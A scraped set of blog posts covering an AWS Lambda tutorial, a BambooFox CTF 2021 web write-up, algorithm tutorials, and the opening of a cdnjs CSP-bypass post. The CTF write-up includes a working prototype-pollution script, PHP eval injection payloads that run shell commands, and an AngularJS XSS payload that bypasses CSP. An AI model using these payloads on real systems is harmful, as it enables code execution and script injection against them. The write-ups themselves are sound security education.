interface, which has a fully functional editor (I always feel very familiar with it, and later I realized that it should be because Amazon bought Cloud9. I used Cloud9’s IDE when I took CS50 before, no wonder it’s so familiar): Finally, after setting the environment variable token, it is completed. After testing, I found that the issue was successfully created. The first task was completed easily. Thanks to Lambda’s efforts. 2. Synchronize every comment under each issue to Slack.This is the simplest of the three tasks because Slack’s original advantage is that it can be integrated with many ready-made things. You can install the GitHub App on Slack and use commands to subscribe to a specific repo and event. Because this is too simple, I don’t need to introduce it anymore. I’ll show you the result directly: 3. Integrate GitHub Webhook to synchronize records to a spreadsheet.We can easily implement this task by using Lambda with other AWS services. The process is as follows: The student leaves a message, triggering the GitHub Webhook. The GitHub Webhook hits AWS API Gateway. Trigger the Lambda function through API Gateway. The Lambda function writes to the spreadsheet via the Google Sheet API. Let’s first prepare the API to be sent to the webhook. Here, we use API Gateway to trigger Lambda, like this: API Gateway configuration is also super convenient. You just need to set what HTTP method to use, and it will give you a URL. For example, if I set it to GET, you can trigger Lambda by using GET to call this API. It can create a webhook in a very short time, which is much more convenient than building your own server and setting up domain and https. Next is to integrate with the Google Sheet API. After looking at the official API, I found that it still maintains the usual style, which is that the document is very complete but the explanation is very complicated. I couldn’t figure out how to implement the functionality I needed at a glance, so I found a package that someone else had wrapped: Simple Google Spreadsheet Access (node.js), which is much easier to use. The most troublesome permission management also teaches you how to implement it. Basically, you need to create a Service Account, set it to have permission to the Google Drive API, and then generate a token for this account. You can use that token. What the main program needs to do is basically to filter the data, then find the account from the data sent over from GitHub, and pass the account and date to another function I wrote separately. Finally, return the result to end: var updateSheet = require('./lib') exports.handler = async (event, context, callback) => &#123; if (!event.body) return 'no body' const body = JSON.parse(event.body) || &#123;&#125; if (!body || body.action !== 'created') return response(callback) const title = body.issue.title.split(' ') if (!title.length) return response(callback) const date = title[1] const account = body.comment.user.login console.log('log:', date, account) try &#123; await updateSheet(date, account) return callback(null, &#123; statusCode: 200, body: date + account &#125;) &#125; catch (err) &#123; console.log('error:', err) &#125; return response(callback) &#125;; const response = (cb) => &#123; cb(null, &#123; statusCode: 200, body: 'ok' &#125;) &#125; The updateSheet function does a simple job, which is to find the correct position based on the date and account, and change the value of that cell to O. Here is some sample code for your reference: async function searchAccount(sheet, account) &#123; const firstRow = await getCells(sheet, &#123; 'min-row': 1, 'max-row': 1 &#125;) const length = firstRow.length for(var i=0; i&lt;length; i++) &#123; if (firstRow[i].value === account) &#123; return &#123; col: firstRow[i].col, batchId: firstRow[i].batchId &#125; &#125; &#125; return null &#125; async function setValue(sheet, row, col, value) &#123; const cells = await getCells(sheet, &#123; 'min-row': row, 'max-row': row, 'min-col': col, 'max-col': col, 'return-empty': true &#125;) if (cells &amp;&amp; cells[0]) &#123; cells[0].value = value cells[0].save(function(err) &#123; if (err) &#123; console.log('err', err) &#125; &#125;) &#125; &#125; async function updateSheet(date, account) &#123; try &#123; const sheet = await getSheet() const accountPosition = await searchAccount(sheet, account) const datePosition = await searchDate(sheet, date) console.log('position:', accountPosition, datePosition) if (!accountPosition || !datePosition) return await setValue(sheet, datePosition.row, accountPosition.col, 'O') &#125; catch (err) &#123; console.log('err', err) &#125; &#125; Finally, just set the webhook URL on GitHub, and everything is done! How to debug on Lambda?Although I wrote it lightly above, I actually encountered a few small problems during development. The first is that debugging is not as straightforward as on a computer, and webhooks are usually harder to debug. Regarding this part, Lambda will actually send the log to CloudWatch, so you need to write logs in the app yourself, and then analyze those logs in CloudWatch. If it is a simple application, it should be quite easy. If it is more complex, the function should be divided into smaller ones, otherwise debugging will be quite troublesome. Another problem I encountered is that the Google Sheet API is slower, and the entire process takes about 5 seconds. The default timeout is about 3 seconds, so remember to increase the timeout yourself, otherwise it will keep failing. SummaryThis time, the experience of using AWS Lambda was pretty good. I didn’t encounter any major difficulties during the development process, which may be related to the fact that what I wanted to implement was relatively simple. But I think this kind of simple thing is super suitable for this kind of serverless solution, because it is really convenient without a server, and it saves a lot of trouble. In the future, if there are similar simple requirements, I think I will still use this solution, just connect one ready-made service to another, and everything will be done. I also recommend that if you want to do some small things, you might as well try to use these ready-made services to get things done, which can save a lot of time.","link":"/2018/09/14/en/aws-lambda-and-github-api/"},{"title":"BambooFox CTF 2021 writeup","text":"PrefaceRecently, my interest is playing CTF, and I only play web problems inside, for a simple reason, because I don’t know anything about other fields… Currently, I am more interested in web things, so I solve problems as a leisure activity. This article is a summary of the BambooFox CTF 2021, and I only solved three problems. Time to DrawIt is a website that draws pictures and synchronizes them in real-time, and the source code is attached: const express = require(\"express\"); const cookieParser = require('cookie-parser') var crypto = require('crypto'); const secret = require(\"./secret\"); const app = express(); app.use(cookieParser(secret.FLAG)); let canvas = &#123; ...Array(128).fill(null).map(() => new Array(128).fill(\"#FFFFFF\")) &#125;; const hash = (token) => crypto.createHash('sha256').update(token).digest('hex'); app.get('/', (req, res) => &#123; if (!req.signedCookies.user) res.cookie('user', &#123; admin: false &#125;, &#123; signed: true &#125;); res.sendFile(__dirname + \"/index.html\"); &#125;); app.get('/source', (_, res) => &#123; res.sendFile(__filename); &#125;); app.get('/api/canvas', (_, res) => &#123; res.json(canvas); &#125;); app.get('/api/draw', (req, res) => &#123; let &#123; x, y, color &#125; = req.query; if (x &amp;&amp; y &amp;&amp; color) canvas[x][y] = color.toString(); res.json(canvas); &#125;); app.get('/promote', (req, res) => &#123; if (req.query.yo_i_want_to_be === 'admin') res.cookie('user', &#123; admin: true &#125;, &#123; signed: true &#125;); res.send('Great, you are admin now. &lt;a href=\"/\">[Keep Drawing]&lt;/a>'); &#125;); app.get('/flag', (req, res) => &#123; let userData = &#123; isGuest: true &#125;; if (req.signedCookies.user &amp;&amp; req.signedCookies.user.admin === true) &#123; userData.isGuest = false; userData.isAdmin = req.cookies.admin; userData.token = secret.ADMIN_TOKEN; &#125; if (req.query.token &amp;&amp; req.query.token.match(/[0-9a-f]&#123;16&#125;/) &amp;&amp; hash(`$&#123;req.connection.remoteAddress&#125;$&#123;req.query.token&#125;`) === userData.token) res.send(secret.FLAG); else res.send(\"NO\"); &#125;); app.listen(3000, \"0.0.0.0\"); Because I just solved a prototype pollution problem recently, I saw it at a glance: if (x &amp;&amp; y &amp;&amp; color) canvas[x][y] = color.toString(); and the judgment of the last paragraph: if (req.query.token &amp;&amp; req.query.token.match(/[0-9a-f]&#123;16&#125;/) &amp;&amp; hash(`$&#123;req.connection.remoteAddress&#125;$&#123;req.query.token&#125;`) === userData.token) res.send(secret.FLAG); else res.send(\"NO\"); As long as the userData.token can be controlled through prototype pollution, just find the correct value. The final solution looks like this: var axios = require('axios') var crypto = require('crypto') var baseUrl = 'http://chall.ctf.bamboofox.tw:8787' var myip = '1.1.1.1' const hash = (token) => crypto.createHash('sha256').update(token).digest('hex'); const token = '5555555555555555' const hashValue = hash(`$&#123;myip&#125;$&#123;token&#125;`) async function run() &#123; await axios.get(baseUrl + '/api/draw?x=__proto__&amp;y=token&amp;color=' + hashValue) const response = await axios.get(baseUrl + '/flag?token=' + token) console.log(response.data) &#125; run() Let x &#x3D; __proto__, y &#x3D; token, so it becomes: canvas[&#39;__proto__&#39;][&#39;token&#39;] = xxx, achieving prototype pollution. ヽ(#&#96;Д´)ﾉThe code given for this problem is very short: &lt;?= highlight_file(__FILE__) &amp;&amp; strlen($🐱=$_GET['ヽ(#`Д´)ﾉ'])&lt;0x0A &amp;&amp; !preg_match('/[a-z0-9`]/i',$🐱) &amp;&amp; eval(print_r($🐱,1)); The restrictions seem very strict, and the length can only be up to 9, and there can be no English or numbers. I have solved similar problems before, which require using xor or not to generate characters, and then using the feature of PHP to execute functions by the name of string functions to achieve RCE. However, the length limit of this problem is 9, which is impossible no matter how you think about it, because even some basic characters have already exceeded it. So thinking from another angle, I tried to use an array, and after trying it myself, I found that the array can indeed bypass it, and the first two judgments can be passed. The next question is how to make: eval(print_r($🐱,1) can be executed smoothly. My initial idea here is to make the things printed by print_r become legal PHP code, so it can be executed successfully. So I first tried to run PHP with the format printed by print_r, and tried the following: &lt;?php $arr = array( [0] => 1 ); print_r($arr); ?> After execution, it will output: PHP Fatal error: Illegal offset type in &#x2F;Users&#x2F;li.hu&#x2F;Documents&#x2F;playground&#x2F;php-test&#x2F;er.php on line 3 It seems that the index of the array cannot be an array, otherwise an error will occur. I thought that this route should not work, but then I thought: “Since it will cause an error, is it possible to execute the function I want to execute before the error occurs?” and tried the following code: &lt;?php $arr = array( [0] => system(\"ls\") ); print_r($arr); ?> I found that the result was printed out! And the original fatal error became a warning: Warning: Illegal offset type in &#x2F;Users&#x2F;huli&#x2F;Documents&#x2F;security&#x2F;ais&#x2F;php-challenge&#x2F;b.php on line 3 I still don’t know why until now, but as long as the value part has a function call, it will be like this. So as long as the things generated by print_r become a piece of legal code, any character can be inserted, and the second half can be commented out with /*, and the final solution looks like this: abs(1)); echo shell_exec(\"cat /*\"); /* First use abs(1) to turn the fatal error into a warning, then execute the desired code, and finally use comments to skip the back, and successfully get the flag. After the game, I looked at other people’s solutions and found that the query string is so magical. I always thought that the query string could only pass arrays, like this: ?a[]=1&amp;a[]=2, but later I found out that there can be things inside [], like this: ?a[test]=1, in PHP, you can get: Array ( [test] => 1 ) If it is like this, you can make the key /* and the value */]); echo 123;/*, and combine them into: &lt;?php Array( [/*] => \"*/]); echo 123;/*\" ); ?> Then successfully compose a piece of legal PHP code. The most valuable thing I learned from this question is that query strings can not only pass arrays but also objects (at least PHP and Express support it, I’m not sure about others). calc.exe onlineThis is a calculator program, and the code is as follows: &lt;?php error_reporting(0); isset($_GET['source']) &amp;&amp; die(highlight_file(__FILE__)); function is_safe($query) &#123; $query = strtolower($query); preg_match_all(\"/([a-z_]+)/\", $query, $words); $words = $words[0]; $good = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'ncr', 'npr', 'number_format']; $accept_chars = '_abcdefghijklmnopqrstuvwxyz0123456789.!^&amp;|+-*/%()[],'; $accept_chars = str_split($accept_chars); $bad = ''; for ($i = 0; $i &lt; count($words); $i++) &#123; if (strlen($words[$i]) &amp;&amp; array_search($words[$i], $good) === false) &#123; $bad .= $words[$i] . \" \"; &#125; &#125; for ($i = 0; $i &lt; strlen($query); $i++) &#123; if (array_search($query[$i], $accept_chars) === false) &#123; $bad .= $query[$i] . \" \"; &#125; &#125; return $bad; &#125; function safe_eval($code) &#123; if (strlen($code) > 1024) return \"Expression too long.\"; $code = strtolower($code); $bad = is_safe($code); $res = ''; if (strlen(str_replace(' ', '', $bad))) $res = \"I don't like this: \" . $bad; else eval('$res=' . $code . \";\"); return $res; &#125; ?> &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css\"> &lt;script defer src=\"https://use.fontawesome.com/releases/v5.3.1/js/all.js\">&lt;/script> &lt;title>Calc.exe online&lt;/title> &lt;/head> &lt;style> &lt;/style> &lt;body> &lt;section class=\"hero\"> &lt;div class=\"container\"> &lt;div class=\"hero-body\"> &lt;h1 class=\"title\">Calc.exe Online&lt;/h1> &lt;/div> &lt;/div> &lt;/section> &lt;div class=\"container\" style=\"margin-top: 3em; margin-bottom: 3em;\"> &lt;div class=\"columns is-centered\"> &lt;div class=\"column is-8-tablet is-8-desktop is-5-widescreen\"> &lt;form> &lt;div class=\"field\"> &lt;div class=\"control\"> &lt;input class=\"input is-large\" placeholder=\"1+1\" type=\"text\" name=\"expression\" value=\"&lt;?= $_GET['expression'] ?? '' ?>\" /> &lt;/div> &lt;/div> &lt;/form> &lt;/div> &lt;/div> &lt;div class=\"columns is-centered\"> &lt;?php if (isset($_GET['expression'])) : ?> &lt;div class=\"card column is-8-tablet is-8-desktop is-5-widescreen\"> &lt;div class=\"card-content\"> = &lt;?= @safe_eval($_GET['expression']) ?> &lt;/div> &lt;/div> &lt;?php endif ?> &lt;a href=\"/?source\">&lt;/a> &lt;/div> &lt;/div> &lt;/body> &lt;/html> In short, it filters the string, and consecutive English words must appear in the list of functions related to math. In addition, there can be no illegal characters, such as $, otherwise it will fail. Many people have solved this question, but I had no clue when I first saw it, and I thought it would be quite troublesome. After sleeping for a while and waking up, I looked at the list of functions again and saw base_convert, which is a conversion of number systems. Recalling the article I wrote before, How to write console.log(1) without alphanumeric characters?, it actually mentioned that any character can be generated by using number system conversion. PHP can execute the code like this: &lt;?php (\"system\")(\"ls /\"); ?> So as long as you can put together the two strings “system” and the command to be executed, this question can be solved. But it should be noted that there will be spaces and “&#x2F;“ in the command, which cannot be converted by number system conversion. What should we do? You can first put together chr, and then use chr with ascii code to generate any character. The final payload is as follows, combining exec and chr to form the command: (base_convert(14, 10, 36).base_convert(33, 10, 36).base_convert(14, 10, 36).base_convert(12,10,36))(base_convert(12, 10, 36).base_convert(10, 10, 36).base_convert(29, 10, 36).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(32).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(47).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(42)) By the way, I manually put it together, but I think I should write a program next time… SummaryI solved these three questions this time, and because it was for leisure, there was no pressure. If I had no idea after looking at the question, I would do something else and come back to continue solving it after a while. It is regrettable that the other two web questions were not solved. One of them is to use special characters to bypass the check, which can be tried with tools like domain-obfuscator. This is also an interesting topic worth studying. The other question is SQL injection combined with other techniques. I tried it a little bit when I was solving it, but didn’t find anything, and I’m not so familiar with this topic, so I didn’t continue. In short, solving CTF questions is still quite interesting. Thanks to the organizers and question makers.","link":"/2021/01/24/en/bamboofox-ctf-2021-writeup/"},{"title":"Tips for Beginners in Solving Programming Problems","text":"IntroductionIn the past few years, “problem-solving” seems to have become a trend. When students majoring in computer science go for interviews with big companies, they are required to solve problems. Even non-computer science students are expected to solve problems during interviews. It seems that if you don’t solve problems, you will fall behind others and be eliminated by the company. Actually, I have never been fond of the term “problem-solving”, mainly because of the word “solving”. I don’t know how you interpret this word, but I feel that there is a sense of “solving problems just for the sake of solving problems”, just like the tactic of solving a lot of problems. Although this tactic can be effective if used properly, I always feel that many people will end up with the mentality of “I can solve the problems I have seen, but I can’t solve the ones I haven’t seen”. If that’s the case, I don’t think it’s a good thing. I have written an article before: What should we learn when we are learning to code?, which briefly discusses this issue. In short, I prefer to use the phrase “programming problem-solving” to express what I want to say, rather than the term “problem-solving”. When many people start practicing programming problem-solving, they start with algorithms and data structures. They may read some books or online courses, and start with the classics, such as bubble sort, selection sort, insertion sort, and then move on to more difficult ones, such as merge sort and quick sort. But I think it’s too early for true beginners to learn these things. In short, “if you can’t write a multiplication table, it’s useless to know KMP (or any other algorithm).” If there are two people, A can write a multiplication table but not KMP, and B can write KMP but not a multiplication table, I will definitely eliminate B. Because B is likely to have just memorized the KMP algorithm, rather than truly understanding it, otherwise I don’t believe he can’t write a multiplication table. I also sincerely call on all companies to consider asking relatively simple questions during interviews. Sometimes the results can be surprisingly good. For example, finding the median, determining prime numbers, or adding large numbers, you will find that some people really can’t solve them. In short, I think it’s absolutely fine to use programming problem-solving to familiarize yourself with algorithms, and it’s also a great method, but you need to have a solid foundation. If you don’t have a solid foundation, you’re just memorizing problems. And there’s one more thing that’s very important. Before you start solving problems, you need to understand the problem and grasp the scope of the problem. Many people overlook this and start solving problems directly, which is not a good thing when writing whiteboard problems. So in this article, we will not talk about problem-solving itself, but about what you should do before you start solving problems. Let’s first look at a problem, which comes from the National Junior High School Preliminary Contest of NPSC 2007. Problem Name: Who is the Unfair Person?Since Jay Chou released his new album “Cowboy is Busy”, Da Guo and Xiao Guo have often fantasized about being cowboys. Finally, one day, Da Guo brought two water guns to challenge Xiao Guo. But after playing a few games, Xiao Guo was completely soaked, while Da Guo was dry all over. Finally, Xiao Guo, who had been hiding his anger, spoke up! Xiao Guo: “I can’t even spray you…” Da Guo: “That’s probably because you’re not good enough?” Xiao Guo: “Liar~ Liar~ You must have cheated!” Although Xiao Guo is inferior to Da Guo in everything (such as intelligence, motor skills, etc.), if Da Guo prepares a worse water gun for Xiao Guo in advance, it means that Da Guo is a bad person who has planned this game to be unfair from the beginning. You, who happened to pass by, were caught by the two noisy guys to be the referee. Input DescriptionThe input will be two strings M and N. M represents the range of Da Guo’s water gun, and N represents the range of Xiao Guo’s water gun. Note that for accuracy, the length unit of all ranges is nanometers. Because the water gun Da Guo brought is a product of the 22nd century, the range of the water gun is very, very far, up to 400 digits (the range must be a non-negative integer). Output DescriptionFor each set of test data, you should return a string. From Xiao Guo’s perspective (although he is stupid, he is still very cunning!), determine whether this is a fair game (for Xiao Guo, as long as Da Guo’s range is not greater than Xiao Guo’s, it is a fair game). If it is a game that is advantageous to Xiao Guo, return “Fair”, otherwise return “Unfair”. Example Input123 456 Example OutputFair The above is a complete problem, including problem introduction, input description, output description, and examples. You may think it’s just a matter of comparing two numbers, but it’s not that simple. Next, let’s see what we should pay attention to. 1. Scope of the ProblemWhy must the scope be given for this kind of programming problem-solving problem? To answer this question is simple. Let’s take a look at the following example: Please write a function to determine whether a number is prime. You may have finished writing it quickly and then submitted it. But because this problem is very unclear, you can’t confirm whether your answer is correct, for example: Should it return true or false? Or return the strings “YES” and “NO”? What if the input is a string? Do I need to process it? What if it is a decimal or negative number? Do I need to handle it specially? What happens if the number exceeds the range of an integer? If the input and output are not clearly defined, you cannot write a “correct” program because there is no such thing as “correct”. Therefore, the first purpose of defining the input range is to help you clarify the problem. For example, a good problem statement would look like this: Write a function that takes a positive integer n (1&lt;&#x3D;n&lt;&#x3D;100000) and returns true if n is a prime number, false otherwise. When the problem says “given a positive integer n (1&lt;&#x3D;n&lt;&#x3D;100000)”, it means you can completely ignore cases beyond this range. n will never be a string, an array, 0, a decimal or a negative number, so you don’t need to worry about these cases. By the way, this is a mistake that many people make when solving whiteboard questions during interviews. They start implementing without clarifying the problem scope. Whiteboard questions can be discussed with the interviewer, so you should clarify the problem scope before starting to solve it, and the problem scope will actually affect your solution. Taking the above problem as an example: Because the water gun brought by Da Guo is a product of the 22nd century, the range of the water gun is very, very far, up to a 400-digit number (the range must be a non-negative integer). For example, in JavaScript, some people may naively think that this problem is testing you on comparing two “numbers”. Can JavaScript store a 400-digit number? It cannot. You can use Number.MAX_SAFE_INTEGER to get the largest number that can be stored in the Number type, which is less than 20 digits, let alone 400 digits. If the problem tells you that the number is within 10 digits, you can simply convert the string to a number and compare the size, and then return the result. But if the number is 400 digits, you cannot use the Number type. So either you directly compare strings to determine the size, or you use the more trendy BigInt to solve it. If the problem does not provide a range, you cannot decide what approach to take. So the purpose of the range is to define the problem more clearly, draw a line there, and tell you: “Hey, the problem range ends here, you don’t need to consider anything beyond the boundary.” 2. Testing after writingIf it is an Online Judge (OJ) system, you can keep trying and testing, write the code and submit it, and debug and find errors if there are any. If there are no errors, you can solve the next problem. But in competitions or some interviews, you only have one chance, or there will be penalties if you answer incorrectly, so you should check it several times before submitting it to make sure there are no problems. Testing is very important at this time. Basically, there are several methods to test whether the program you wrote is correct. For example, the first and simplest one: test with the sample data provided by the problem. If the sample data cannot pass, then it must be wrong. Secondly, if possible, write a program to test it. Some problems can be done, and some cannot. For example, it may not be possible to determine whether it is a prime number, unless you find someone else’s code for determining prime numbers to use. But for the above problem of comparing numbers, you can write a program to test for small ranges (less than 10 digits): // correct implementation function compare(a, b) &#123; return b >= a ? 'Fair' : 'Unfair' &#125; for(let i = 1; i &lt;=10000; i++) &#123; // generate random data const a = Math.floor(Math.random() * 1e9) const b = Math.floor(Math.random() * 1e9) if (compare(a, b)!== stringCompare(a + '', b + '')) &#123; // print data console.log('error', a, b) &#125; &#125; Run it ten times and you will test 100,000 data, which can ensure some correctness. In addition to this, there is one more important thing: generate your own test data, and generate boundary condition test data. 3. Boundary conditionsBoundary conditions are usually referred to as boundary case, corner case, edge case, etc. (the most accurate definition seems to be different, but the concept should be similar). In short, it is the test data that is easy to make your program fail, and it tests whether your program will fail under extreme conditions. Taking the above example of comparing numbers as an example, it may be 0 0, 0 10 and other conditions that are less likely to be considered. Or, taking the example of large number addition (adding two strings as numbers, for example, &#39;123&#39;+&#39;123&#39; =&gt; &#39;456&#39;), it will be: 0 + 0, adding two zeros 0 + 9999, no change after adding 1 + 9999, there will be a carry after adding Finally, taking the example of judging palindrome, it may be: Empty string A string with only one character These edge cases are easy to overlook and cause errors, so when generating test data, it is best to think about which edge cases are not considered. Many times, if you don’t get full marks, it’s because you didn’t consider these edge cases. But even if you get full marks, does it mean that you are really correct? 4. Possibility of false solutionsGenerally speaking, we call those solutions that pass the OJ but are not correct as “false solutions”. Usually, this happens because the test data on the OJ is too weak, so the false solution can pass. For example, in the above problem of comparing numbers, although the problem states that M and N can be up to 400 digits, the test data may be lazy and only up to five digits at most. In this case, your solution of converting the string to a number and comparing the size can pass, but we won’t say that this is the correct solution, because adding one more test data will make the answer wrong. Or some problems do not limit the time complexity. The expected solution is O(n), but O(n^2) can also pass. Some false solutions are written and you will know that they are false solutions, but some you will not notice. This part actually depends on the OJ to check, and the test data must be carefully generated to avoid such false solutions. ConclusionThe reason for writing this article is to help beginners who have just started solving programming problems to understand that there are more important things to focus on before starting to solve the problem. Remember to define the problem clearly before starting to solve it, which is also one of the essential skills for whiteboard questions in job interviews. If you find that the problem is not defined clearly when writing the problem, then this problem may not be that good. You can report it to the website and ask them to supplement the problem scope. I wish everyone can find joy on the road of solving programming problems.","link":"/2019/11/01/en/before-start-leetcode/"},{"title":"Introduction to Binary Search","text":"IntroductionWhen writing programs, we often use the “search” function. The simplest search is to find the number you want in a string of numbers, which is also our topic today. This article will be divided into three parts. The first part will introduce the linear search method, the second part will introduce the binary search method, and the last part will discuss the different implementation methods of the binary search method under different conditions. Linear SearchTo start with the basics, we’ll start with the most basic linear search method. Just like its name, the linear search method is “finding one by one from beginning to end”, with a time complexity of O(n), which is easy to understand and implement. function linear_search(array, target)&#123; for(var i=0; i&lt;array.length; i++)&#123; if(array[i]==target) return i; &#125; return -1; //not found &#125; Or you can refer to this simple animation, recorded from Algorithm Visualizations Binary SearchIf the sequence to be searched is ordered, we can optimize the linear search method to make the time complexity even lower. The principle of binary search is very similar to the process of playing “Ultimate Password” when we were young, that is, the game of guessing numbers from 1 to 99. In order to guess faster (or let the enemy guess faster), some people will shout the number 50 first. Why? Because no matter whether the number is less than 50 or greater than 50, the remaining numbers that can be guessed will definitely be cut in half, becoming 1&#x2F;2 of the original. Assuming that this continues to be cut in half next time, it will probably take seven or eight guesses to “guarantee” that you can guess it. Here’s a simple verification:If there is only one number, it can be guessed once.If there are only two numbers, it can be guessed twice.If there are only three numbers, it can be guessed twice.If there are only four numbers, assuming they are 1 2 3 4, cut in half and guess 2, the result range becomes 3 4, leaving two numbers, which need to be guessed twice. So if there are four numbers, it will take three guesses to find it. If there are eight numbers, cut in half and there are four left, so you need to guess 1 + 3 &#x3D; 4 times.…Continuing to promote this, it will be found that the number of times that can be guaranteed to be guessed is related to taking log with 2 as the base.The detailed mathematical formula will not be repeated here. Therefore, the process of binary search is also very simple: Determine the left boundary L and the right boundary R. Take (L+R)&#x2F;2 as the number M in the middle. If array[M] &#x3D;&#x3D; the number to be found, return. If array[M]&gt;the number to be found, it means that the numbers from M to R are impossible (because they are all larger than array[M]), so let R &#x3D; M - 1. If array[M]&lt;the number to be found, it means that the numbers from L to M are impossible, so let L &#x3D; M + 1. If R&gt;&#x3D;L, continue with step 2, otherwise return -1 (indicating not found). So L and R will become closer and closer to the number to be found, and each step can eliminate half of the possibilities. The stopping condition here is “when L&gt;R”, which means that it cannot be found. Because L means: the possible value on the far left, in other words, if there is an answer, it must be in the position &gt;&#x3D;L. R represents: the possible value on the far right, if there is an answer, it must be in the position &lt;&#x3D;R. So when L &gt; R, &gt;&#x3D;L and &lt;&#x3D;R are already empty sets, indicating that there is no answer. One thing to note here is (L+R)/2, which may cause overflow when the value is very large. To avoid this situation, it can be rewritten as (R-L)/2 + L. You can refer to a simple animation recorded from Algorithm Visualizations (Blue is L, yellow is R, green is M, and the number to be found is 180) function binary_search(array, target) &#123; var L = 0, R = array.length - 1; while(L&lt;=R) &#123; var M = Math.floor((L+R)/2); if(array[M]==target)&#123; return M; &#125; else if(array[M]>target) &#123; R = M - 1; &#125; else &#123; L = M + 1; &#125; &#125; return -1; &#125; Binary Search under Different ConditionsThe binary search introduced earlier is only used to find out whether a certain number exists in a sequence and, if so, at which position. If there are duplicate numbers in the sequence and the condition is slightly changed to return the “first” occurrence, for example, in the sequence 1 2 2 2 2 2 3 3, if we want to find 2, we return 1 because the first 2 appears at index 1. Alternatively, we can change it to return the “last” occurrence. Using the same example as above, we want to return 5 because index 5 is the last 2. There are even more complex variations, such as the following four: Return the first position &gt;&#x3D; target Return the first position &gt; target Return the last position &lt;&#x3D; target Return the last position &lt; target (Refer to: lower_bound) Combined with finding the first and last positions of target, there are a total of 6 variations. So how do we deal with them? In fact, the principles are very similar. We still use binary search to eliminate the most numbers, but there are some slight differences in some condition judgments. If not done properly, it is easy to cause an infinite loop, such as finding the last number less than target: function search(array, target)&#123; var L = 0, R = array.length - 1; while(L&lt;=R) &#123; var M = Math.floor((L+R)/2); if(array[M]&lt;target)&#123; L = M; &#125; else &#123; R = M - 1; &#125; &#125; return M; &#125; We use this example to run: search([1,2,3,4,5],2). At the beginning, L&#x3D;0, R&#x3D;4, M&#x3D;2. array[2] = 3 &gt; 2, so R = 2-1 = 1. Then L&#x3D;0, R&#x3D;1, M&#x3D;0. array[0] = 1 &lt; target, so L = M = 0. Then it will repeat the same steps and fall into an infinite loop. This is one of the most common situations when writing binary search. Some conditions are not set properly, maybe just missing an equal sign or +1 -1, but it just can’t be solved. There are many articles on the Internet that explain how to set these conditions: Implementation and Application Summary of Binary Search Talking about Binary Search Simple Analysis and Summary of Binary Search Or this Q&amp;A on Zhihu also has many discussions to refer to: How many ways are there to write binary search? What are the differences? Among them, my favorite is this answer: Speaking of interviews, the difficulty of this question lies in the final boundary condition, so we don’t need to judge that boundary at all. When the interval is reduced to a small extent, such as less than 5 elements, just use sequential search. After all, it is also O(lgN), and the average number of comparisons required for sequential search of the last 5 elements is only two or three times, which is similar to your binary search. I personally recommend writing like this in actual engineering, which can avoid many troublesome bugs and solve problems in the most secure way. I have also thought about this idea before. Since it is so troublesome to add or subtract 1 or whether to add an equal sign, why not just leave it out? Just change the termination condition and the judgment logic. Using the same example as above: finding the last number less than target. The basic principle is: Ensure that the answer is definitely in the closed interval [L, R] When there are very few numbers left in this interval, use linear search instead. This way, we don’t have to worry about encountering infinite loops. The following is the code: // Return the last number &lt; target function lower_bound(array, target) &#123; // First, check if there is no answer // If the first number is still not &lt; target, there is no answer if(array[0]>=target) return -1; // The end condition is when there are only two numbers left in the interval var L = 0, R = array.length-1; while((R-L+1)>2) &#123; var M = Math.floor((L+R)/2); if(array[M]&lt;target)&#123; L = M; &#125; else &#123; R = M - 1; &#125; &#125; // Use linear search within the answer range for(var i=R; i>=L; i--)&#123; if(array[i]&lt;target)&#123; return i; &#125; &#125; &#125; Even if the conditions change, such as finding &gt;=target, &lt;target, etc., as long as the conditions are modified, a similar structure can be used to obtain the answer. ConclusionActually, I wanted to study binary search in different situations, how to set those conditions, and whether there are any unified rules to refer to. But in the end, I found that the solution given at the end of the article is the most convenient, not only easy to think of, but also easy to write. There is no need to worry about the symbols of &lt;&gt;&#x3D; and +1-1, and the execution efficiency is also similar. I am not a professional in algorithms. If there is any mistake in the article, please kindly correct me &lt;(_ _)&gt; Finally, here is the non-rigorous test and various versions of JavaScript code: https://repl.it/DgDU/1","link":"/2016/09/23/en/binary-search-introduction/"},{"title":"Who pollutes your prototype? Find the libs on cdnjs in an automated way","text":"When it comes to CSP bypass, a kind of technique using AngularJS is well-known. One of it’s variant requires another library called Prototype.js to make it works. After understanding how it works, I began to wonder if there are other libraries on cdnjs that can do similar things, so I started researching. This article will start with the CSP bypass of cdnjs, talk about why prototype.js is needed, and then mention how I found its replacement on cdnjs. cdnjs + AngularJS CSP bypassPutting https://cdnjs.cloudflare.com in the CSP is actually a very dangerous thing, because there is a way that many people know to bypass this CSP. For details, please refer to these two articles: Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup H5SC Minichallenge 3: “Sh*t, it’s CSP!” The bypass is as follows: &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>CSP bypass&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src https://cdnjs.cloudflare.com\"> &lt;/head> &lt;body> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert('xss')&#125;&#125; &lt;/div> &lt;/body> &lt;/html> I will explain how it works step by step. First, because cdnjs is allowed in CSP, we can import any libraries hosting on cdn.js. Here we choose AngularJS so that we can use CSTI to inject the following HTML: &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert('xss')&#125;&#125; 